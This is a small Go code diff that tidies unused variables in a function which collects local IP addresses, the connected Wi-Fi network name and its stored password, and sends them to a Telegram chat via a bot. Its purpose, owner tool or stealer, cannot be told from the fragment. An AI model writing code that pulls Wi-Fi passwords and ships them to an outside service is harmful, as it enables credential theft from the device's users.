@@ -346,7 +346,7 @@ func getConnectedSSID() string {
 // sendInfo collects network info and sends a formatted message to chatID
 func sendInfo(bot *tgbotapi.BotAPI, chatID int64) {
     ipMap := getLocalIPs()
-    wifiName, wifiIP, ethName, ethIP, firstIP := guessNicRoles(ipMap)
+    _, wifiIP, _, ethIP, firstIP := guessNicRoles(ipMap)
     ssid := getConnectedSSID()
     wifiPassword := getWifiPassword(ssid)
 
